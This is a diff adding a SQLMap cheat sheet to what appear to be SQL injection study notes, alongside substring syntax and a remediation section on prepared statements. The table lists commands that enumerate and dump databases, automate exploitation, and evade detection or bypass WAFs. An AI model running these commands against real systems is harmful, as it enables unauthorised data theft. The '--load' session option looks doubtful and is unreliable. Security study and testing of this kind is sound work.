@@ -143,6 +143,35 @@
 - Substring: Others: SUBSTRING('footbar', 4, 2); Oracle: SUBSTR('footbar', 4, 2)
 - [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
+**SQLMap cheat sheet**
+Install: git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev  
+Update: python sqlmap.py --update 
+
+# SQLMap Cheat Sheet
+
+This cheat sheet summarizes useful SQLMap commands for detecting and exploiting SQL injection vulnerabilities.
+
+| **Command/Option**   | **Description**                                                                 | **Example**                                                                                       |
+|----------------------|---------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------|
+| `-u`                 | Specify the URL to scan for SQL injection.                                       | `sqlmap -u "http://example.com/index.php?id=1"`                                                    |
+| `--data`             | Specify `POST` request data to test for SQL injection in form fields.            | `sqlmap -u "http://example.com/login.php" --data="username=admin&password=1234"`                   |
+| `--dbs`              | List all available databases after detecting a vulnerability.                    | `sqlmap -u "http://example.com/index.php?id=1" --dbs`                                              |
+| `-D`                 | Specify the database to target.                                                  | `sqlmap -u "http://example.com/index.php?id=1" -D database_name --tables`                          |
+| `--tables`           | List all tables in a specified database.                                         | `sqlmap -u "http://example.com/index.php?id=1" -D database_name --tables`                          |
+| `-T`                 | Specify the table to target.                                                     | `sqlmap -u "http://example.com/index.php?id=1" -D database_name -T table_name --dump`              |
+| `--dump`             | Dump all data from the specified table.                                          | `sqlmap -u "http://example.com/index.php?id=1" -D database_name -T table_name --dump`              |
+| `--batch`            | Automate exploitation without asking for user interaction.                       | `sqlmap -u "http://example.com/index.php?id=1" --batch --dbs`                                      |
+| `--cookie`           | Use a specific cookie value for authenticated requests.                          | `sqlmap -u "http://example.com/index.php?id=1" --cookie="PHPSESSID=abcd1234"`                      |
+| `--user-agent`       | Specify a custom User-Agent string.                                              | `sqlmap -u "http://example.com/index.php?id=1" --user-agent="Mozilla/5.0"`                         |
+| `-p`                 | Specify which parameter to test for SQL injection.                               | `sqlmap -u "http://example.com/index.php?id=1&name=admin" -p id`                                   |
+| `--technique=T`      | Specify the SQL injection technique (e.g., time-based).                          | `sqlmap -u "http://example.com/index.php?id=1" --technique=T`                                      |
+| `--random-agent`     | Use a random User-Agent string to evade detection.                               | `sqlmap -u "http://example.com/index.php?id=1" --random-agent`                                     |
+| `--tamper`           | Use a tamper script to modify the payload (useful to bypass WAFs).               | `sqlmap -u "http://example.com/index.php?id=1" --tamper=space2comment`                             |
+| `--proxy`            | Route traffic through a proxy (e.g., for Burp Suite).                            | `sqlmap -u "http://example.com/index.php?id=1" --proxy="http://127.0.0.1:8080"`                    |
+| `--save`             | Save the session for later use.                                                  | `sqlmap -u "http://example.com/index.php?id=1" --save=saved_session`                               |
+| `--load`             | Load a previously saved session.                                                 | `sqlmap -u "http://example.com/index.php?id=1" --load=saved_session`                               |
+
+
 **Remediation**
 - Prepared Statements (With Parameterized Queries)
   `PreparedStatement pstmt = connection.prepareStatement(query);`
